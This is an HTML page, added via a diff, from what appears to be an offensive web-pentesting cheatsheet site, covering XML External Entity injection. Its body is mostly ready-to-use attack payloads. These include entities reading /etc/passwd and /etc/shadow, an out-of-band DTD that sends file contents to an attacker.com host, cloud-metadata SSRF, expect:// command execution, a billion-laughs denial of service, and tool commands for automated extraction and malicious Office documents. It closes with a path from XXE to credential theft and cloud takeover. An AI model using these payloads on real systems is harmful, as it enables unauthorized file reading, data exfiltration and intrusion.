@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XXE | JinPwn</title><meta name="description" content="XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web07-xxe/">
+<meta property="og:title" content="XXE | JinPwn">
+<meta property="og:description" content="XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web07-xxe/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="XXE | JinPwn">
+<meta name="twitter:description" content="XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"XXE | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web07-xxe/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link is-current">XXE</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>XXE</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">XXE</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Web Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link is-current">XXE</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
+</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
+    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>XML parsers are everywhere, often hidden:</p>
+<p><strong>Obvious</strong>:</p>
+<ul>
+<li>SOAP endpoints</li>
+<li>REST APIs accepting <code>Content-Type: application/xml</code> or <code>text/xml</code></li>
+<li>RSS / Atom feed readers</li>
+<li>WebDAV endpoints</li>
+<li>XML-RPC interfaces (often at <code>/xmlrpc.php</code>)</li>
+</ul>
+<p><strong>Hidden inside other formats</strong> (every modern Office doc is a zip of XML):</p>
+<ul>
+<li>DOCX, XLSX, PPTX uploads - <code>content.xml</code>, <code>word/document.xml</code></li>
+<li>SVG uploads - entire format is XML</li>
+<li>PDF uploads (some processors parse embedded XML metadata)</li>
+<li>XMP metadata in images</li>
+<li>ICS calendar uploads</li>
+<li>KML / KMZ (Google Earth) uploads</li>
+<li>OOXML in older Office processors</li>
+</ul>
+<p><strong>Inside auth flows</strong>:</p>
+<ul>
+<li>SAML assertions (signed XML)</li>
+<li>WS-Security tokens</li>
+<li>XML-based OAuth implementations</li>
+</ul>
+<p><strong>Inside DBs and APIs</strong>:</p>
+<ul>
+<li>GraphQL with XML response support enabled</li>
+<li>BaseX, eXist-db, MarkLogic DBs over HTTP</li>
+</ul>
+<p>Signal that XML is being parsed:</p>
+<ul>
+<li>App accepts XML-shaped bodies and returns parsed content</li>
+<li>Filename ends <code>.xml</code>, <code>.svg</code>, <code>.docx</code>, <code>.xlsx</code></li>
+<li><code>Content-Type: application/xml</code> in request or response</li>
+<li>Error messages mention <code>SAXParseException</code>, <code>XMLParser</code>, <code>lxml</code></li>
+</ul>
+<h2 id="ii-quick-detection" data-heading-permalink="true"><span class="heading-content">ii. Quick detection</span>
+    <a class="heading-permalink" href="#ii-quick-detection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Send a request with a basic external entity probe. The classic file-read test:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY x SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></div><p>When <code>/etc/passwd</code> contents appear in the response, you&rsquo;re in.</p>
+<p>When you see no body change, switch to OOB blind XXE - see section iv.</p>
+<h2 id="iii-burp--tooling" data-heading-permalink="true"><span class="heading-content">iii. Burp + tooling</span>
+    <a class="heading-permalink" href="#iii-burp--tooling" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Burp&rsquo;s Pro scanner includes active XXE checks. For manual testing in Burp:</p>
+<ul>
+<li>Send request to Repeater</li>
+<li>Drop in a probe payload from PayloadsAllTheThings</li>
+<li>Watch the response</li>
+</ul>
+<p>XXEinjector for automated extraction:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ruby XXEinjector.rb --host<span class="o">=</span>oast.live --httpport<span class="o">=</span><span class="m">8000</span> --file<span class="o">=</span>request.txt
+</span></span><span class="line"><span class="cl"><span class="c1">## Reads request.txt, attempts both direct and OOB XXE, extracts files</span>
+</span></span></code></pre></div><p>oxml_xxe for crafting XXE payloads inside DOCX/XLSX/PPTX:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/BuffaloWill/oxml_xxe
+</span></span><span class="line"><span class="cl">ruby ./oxml_xxe.rb
+</span></span><span class="line"><span class="cl"><span class="c1">## Loads in browser, lets you build a malicious office doc and download</span>
+</span></span></code></pre></div><p>dotdotpwn for testing file path patterns in XXE responses:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dotdotpwn -m xxe -h target.com -O unix -t <span class="m">10</span>
+</span></span></code></pre></div><h2 id="iv-blind-xxe-via-oast" data-heading-permalink="true"><span class="heading-content">iv. Blind XXE via OAST</span>
+    <a class="heading-permalink" href="#iv-blind-xxe-via-oast" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Most modern parsers disable inline entity expansion in responses. Use OOB exfiltration via a parameter entity that resolves to your server:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % ext SYSTEM &#34;http://attacker.com/x.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">%ext;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root&gt;</span>test<span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></div><p>Your server hosts <code>x.dtd</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % data SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://attacker.com/?%data;&#39;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl">%param1;
+</span></span></code></pre></div><p>The target parses your DTD, reads <code>/etc/passwd</code>, sends it back via the exfil URL.</p>
+<p>interactsh / Burp Collaborator as the listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">interactsh-client
+</span></span><span class="line"><span class="cl"><span class="c1">## Or use Burp&#39;s built-in Collaborator</span>
+</span></span></code></pre></div><p>Many parsers (libxml2 default) accept the external DTD fetch even when in-band entity expansion is disabled.</p>
+<h2 id="v-php-filter-chain-for-base64-file-read" data-heading-permalink="true"><span class="heading-content">v. PHP filter chain for base64 file read</span>
+    <a class="heading-permalink" href="#v-php-filter-chain-for-base64-file-read" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When the file you want has bytes that break XML (NULL, control chars), wrap it through PHP filters first. Works only when the target is PHP and <code>php://filter</code> is accessible:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY x SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/shadow&#34;&gt;</span>
+</span></span></code></pre></div><p>Returns base64 in the response. Decode on your side.</p>
+<h2 id="vi-svg-upload-xxe" data-heading-permalink="true"><span class="heading-content">vi. SVG upload XXE</span>
+    <a class="heading-permalink" href="#vi-svg-upload-xxe" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>SVG is XML. Many image-handling pipelines (avatar upload, profile photo) pass SVG through a parser before stripping or converting.</p>
+<p>Minimal test SVG:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE svg [&lt;!ENTITY x SYSTEM &#34;file:///etc/hostname&#34;&gt;</span>]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;20&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p>Upload, view the rendered image. The hostname appears in the text.</p>
+<p>Variant: librsvg + ImageMagick processing the SVG can be combined with ImageTragick-style exploits.</p>
+<h2 id="vii-office-document-xxe-docx-xlsx-pptx" data-heading-permalink="true"><span class="heading-content">vii. Office document XXE (DOCX, XLSX, PPTX)</span>
+    <a class="heading-permalink" href="#vii-office-document-xxe-docx-xlsx-pptx" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>These are zip archives containing XML. Inject XXE into one of the inner XML files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip target.docx -d unpacked/
+</span></span><span class="line"><span class="cl"><span class="c1">## Edit unpacked/word/document.xml - inject XXE at top</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Repack:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> unpacked <span class="o">&amp;&amp;</span> zip -r ../malicious.docx .
+</span></span></code></pre></div><p>Then upload to the target&rsquo;s &ldquo;open document&rdquo; feature. Common in cv-parser, doc-to-pdf, OCR services.</p>
+<h2 id="viii-saml-xxe" data-heading-permalink="true"><span class="heading-content">viii. SAML XXE</span>
+    <a class="heading-permalink" href="#viii-saml-xxe" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>SAML responses are XML. If the SAML library doesn&rsquo;t disable external entities, you have XXE in an auth flow.</p>
+<p>Test by intercepting a SAML response with Burp + SAML Raider extension, injecting an external entity into the assertion, replaying. If the IdP echoes errors or trusts the assertion with injected entities, XXE.</p>
+<h2 id="ix-xxe-to-ssrf" data-heading-permalink="true"><span class="heading-content">ix. XXE to SSRF</span>
+    <a class="heading-permalink" href="#ix-xxe-to-ssrf" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Any URL handler in an entity becomes SSRF. The payload reads from your URL of choice:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY x SYSTEM &#34;http://169.254.169.254/latest/meta-data/&#34;&gt;</span>
+</span></span></code></pre></div><p>Standard SSRF targets apply - see [[WEB12 SSRF]]. Cloud metadata endpoints are the highest-value (see [[Cloud Recon]] section viii for AWS / Azure / GCP IMDS).</p>
+<p>Java parsers also support <code>gopher://</code>, <code>ftp://</code>, <code>jar://</code>, sometimes <code>netdoc://</code> which expand the attack surface.</p>
+<h2 id="x-xxe-to-rce" data-heading-permalink="true"><span class="heading-content">x. XXE to RCE</span>
+    <a class="heading-permalink" href="#x-xxe-to-rce" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Direct RCE via XXE is rare and language-specific:</p>
+<ul>
+<li>PHP with <code>expect://</code> wrapper enabled (rare default):
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY x SYSTEM &#34;expect://id&#34;&gt;</span>
+</span></span></code></pre></div></li>
+<li>Java with <code>jar://</code> plus crafted JAR fetch (older parsers)</li>
+<li>XSLT injection alongside XXE in some processors</li>
+</ul>
+<p>For most cases, XXE → file read of credentials → use creds elsewhere → RCE.</p>
+<h2 id="xi-billion-laughs-dos-mostly-informational" data-heading-permalink="true"><span class="heading-content">xi. Billion laughs (DoS, mostly informational)</span>
+    <a class="heading-permalink" href="#xi-billion-laughs-dos-mostly-informational" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Recursive entity expansion exhausts memory:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY lol &#34;lol&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY lol2 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></div><p>DoS-only, mention in report but don&rsquo;t trigger on production targets.</p>
+<h2 id="xii-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">xii. Tricks worth knowing</span>
+    <a class="heading-permalink" href="#xii-tricks-worth-knowing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="try-without-xml-prolog" data-heading-permalink="true"><span class="heading-content">Try without <code>&lt;?xml</code> prolog</span>
+    <a class="heading-permalink" href="#try-without-xml-prolog" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Some parsers tolerate missing XML declaration. Inject into JSON endpoints that fallback to XML parsing on certain content-types.</p>
+<h3 id="content-type-confusion" data-heading-permalink="true"><span class="heading-content">Content-Type confusion</span>
+    <a class="heading-permalink" href="#content-type-confusion" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Send XML body to a JSON-accepting endpoint:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/users&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s1">&#39;Content-Type: application/xml&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY x SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt;&#39;</span>
+</span></span></code></pre></div><p>Some frameworks auto-detect content type and parse based on body shape, not header.</p>
+<h3 id="xinclude-when-full-xxe-is-blocked" data-heading-permalink="true"><span class="heading-content">XInclude when full XXE is blocked</span>
+    <a class="heading-permalink" href="#xinclude-when-full-xxe-is-blocked" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>XInclude is a separate XML feature that allows inclusion of external resources. Sometimes enabled even when DTD parsing is disabled:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;root</span> <span class="na">xmlns:xi=</span><span class="s">&#34;http://www.w3.org/2001/XInclude&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;xi:include</span> <span class="na">parse=</span><span class="s">&#34;text&#34;</span> <span class="na">href=</span><span class="s">&#34;file:///etc/passwd&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></div><h3 id="dont-forget-xslt" data-heading-permalink="true"><span class="heading-content">Don&rsquo;t forget XSLT</span>
+    <a class="heading-permalink" href="#dont-forget-xslt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>XML processing pipelines sometimes accept XSLT transformations from user input. XSLT abuses include file read, SSRF, and depending on the processor, code execution.</p>
+<h3 id="xpath-injection-is-the-other-xml-bug" data-heading-permalink="true"><span class="heading-content">XPath injection is the other XML bug</span>
+    <a class="heading-permalink" href="#xpath-injection-is-the-other-xml-bug" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When user input is concatenated into an XPath query (not in the document but in the query selector), you can extract data similarly to SQLi. Common in LDAP-XPath bridges and XML DBs.</p>
+<h2 id="xiii-references" data-heading-permalink="true"><span class="heading-content">xiii. References</span>
+    <a class="heading-permalink" href="#xiii-references" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener noreferrer">PortSwigger - XXE</a>
+ - best guided lab</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - XXE</a>
+</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank" rel="noopener noreferrer">HackTricks - XXE</a>
+</li>
+<li><a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener noreferrer">oxml_xxe</a>
+ - office doc XXE generator</li>
+<li><a href="https://github.com/SAMLRaider/SAMLRaider" target="_blank" rel="noopener noreferrer">SAML Raider</a>
+ - Burp extension for SAML XXE</li>
+</ul>
+<h2 id="xiv-where-it-leads" data-heading-permalink="true"><span class="heading-content">xiv. Where it leads</span>
+    <a class="heading-permalink" href="#xiv-where-it-leads" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li>File read → <code>/etc/passwd</code>, <code>/etc/shadow</code> (if readable), SSH keys, app configs, cloud credentials</li>
+<li>SSRF via XXE → cloud metadata → cloud takeover via [[AWS]] / [[Azure]] / [[GCP]]</li>
+<li>Source code read → find more bugs offline (look for hardcoded creds, SQL queries, deserialization sinks)</li>
+<li>SAML XXE → auth bypass / impersonate any user</li>
+<li>PHP <code>expect://</code> → direct RCE → [[04 Initial Access]]</li>
+</ul>
+
+        </div>
+
+        
